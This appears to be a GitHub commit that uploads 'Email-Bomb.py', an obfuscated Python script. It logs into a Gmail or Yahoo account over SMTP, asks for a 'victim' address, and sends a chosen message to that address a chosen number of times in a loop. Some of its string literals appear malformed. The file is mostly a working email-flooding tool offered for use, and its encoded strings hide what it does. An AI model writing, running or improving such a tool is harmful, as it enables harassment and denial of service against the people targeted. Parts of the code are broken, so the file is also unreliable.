e1b0100e6e4af84014151a586113fae9caa866f0
Afshin Ataei <53143786+afshinataei@users.noreply.github.com>
2021-04-20 14:29:56 +0430

    Add files via upload

---
+++ Email-Bomb.py
@@ -0,0 +1,71 @@
+# login to your email
+
+
+# Obfuscated with PyObfx #
+import smtplib as eVrhZPqLIvFdpx
+import sys as TPqXsB
+from termcolor import colored as lkCsHyKfiuqRXh
+
+kiEjrYLAzn = lambda n: n - sum([3, 2, 3])
+oLUGKYvbIP = lambda s: ''.join(chr(int(kiEjrYLAzn(ord(c)))) for c in s)
+print("""
+    _     __     _     _            _   _             _ 
+   / #escaped_char#   / _|___| |__ (_)_ __      / #escaped_char# | |_ __ _  ___(_)
+  / _ #escaped_char# | |_/ __| '_ #escaped_char#| | '_ #escaped_char#    / _ #escaped_char#| __/ _` |/ _ #escaped_char# |
+ / ___ #escaped_char#|  _#escaped_char#__ #escaped_char# | | | | | | |  / ___ #escaped_char# || (_| |  __/ |
+/_/   #escaped_char#_#escaped_char#_| |___/_| |_|_|_| |_| /_/   #escaped_char#_#escaped_char#__#escaped_char#__,_|#escaped_char#___|_|
+                                                        
+""")
+print(lkCsHyKfiuqRXh("""
+
+               for Gmail enter 1
+               for Yahoo enter 2,
+oLUGKYvbIP("zml"))
+
+GXKrAcIq = input(lkCsHyKfiuqRXh(oLUGKYvbIP("(Mv|mz(aw}z(kpwqkmB("), oLUGKYvbIP("jt}m")))
+
+if GXKrAcIq == oLUGKYvbIP("9"):
+    ixkmKbAuqGJn = eVrhZPqLIvFdpx.SMTP(oLUGKYvbIP("{u|x6ouiqt6kwu"), int(kiEjrYLAzn(595)))
+    ixkmKbAuqGJn.starttls()
+elif GXKrAcIq == oLUGKYvbIP(":"):
+    ixkmKbAuqGJn = eVrhZPqLIvFdpx.SMTP(oLUGKYvbIP("{u|x6uiqt6ipww6kwu"), int(kiEjrYLAzn(595)))
+    ixkmKbAuqGJn.starttls()
+else:
+    TPqXsB.exit("[-] you're stupid! run me again!")
+
+print(lkCsHyKfiuqRXh(oLUGKYvbIP("c)e(~mz(quxwz|iv|(ow(|w(p||x{B77uikkw}v|6owwotm6kwu7tm{{{mk}zmixx{7(mvl(mvijtm(q|)"), oLUGKYvbIP("zml")))
+
+pgPLYAjcIU = input(oLUGKYvbIP("mv|mz(w}z(muiqt(pmzmB("))
+xMFrSjkRgEsKUdhq = input(oLUGKYvbIP("mv|mz(w}z(xi{{wzl(pmzmB("))
+
+if not pgPLYAjcIU or not xMFrSjkRgEsKUdhq:
+    print(oLUGKYvbIP("c)e(aw}(u}{|(Twoqv(|w(w}z(ikkw}v|"))
+
+try:
+    ixkmKbAuqGJn.login(pgPLYAjcIU, xMFrSjkRgEsKUdhq)
+    print(oLUGKYvbIP("c3e([}kkm{{n}tt([qovml(qv(i{B("), pgPLYAjcIU)
+
+except eVrhZPqLIvFdpx.SMTPAuthenticationError:
+    print(oLUGKYvbIP("c5e(zwvo(muiqt(wz(xi{{wzl4(wz(|z(|w(mvijtm(tm{{({mk}zm(ixx{(qv(w}z(ikkw}v|("))
+    TPqXsB.exit(oLUGKYvbIP("z}v(um(ioiqv"))
+
+
+def zLFXOcNrExgv():
+    CHOMbPVY = input(lkCsHyKfiuqRXh(oLUGKYvbIP("Xtmi{m(Mv|mz(aw}z(^qk|qu(MuiqtB("), oLUGKYvbIP("jt}m")))
+    EdvyDZtNfxIr = int(input(oLUGKYvbIP("Kw}v|(|w({mv|(|w(~qk|quB(")))
+    CPyoQs = input(oLUGKYvbIP("Mv|mz(aw}z(Um{{iom(B"))
+
+    for XbayQqvDfW in range(int(EdvyDZtNfxIr)):
+        ixkmKbAuqGJn.sendmail(pgPLYAjcIU, CHOMbPVY, CPyoQs)
+        print(XbayQqvDfW, oLUGKYvbIP("c3e({xiuuml({}kkm{{n}tt)"))
+
+
+zLFXOcNrExgv()
+
+while bool(int(kiEjrYLAzn(9))):
+    if __name__ == oLUGKYvbIP("gguiqvgg"):
+        PYzeobqOwAFN = input(oLUGKYvbIP("Lw(w}(iv|(|w(z}v(um(uwzmG"))
+        if PYzeobqOwAFN.strip() in oLUGKYvbIP("(a(m{(am{(aM[").split():
+            zLFXOcNrExgv()
+        else:
+            TPqXsB.exit(oLUGKYvbIP("0B55555555555Owwl(Jm55555555555B1"))
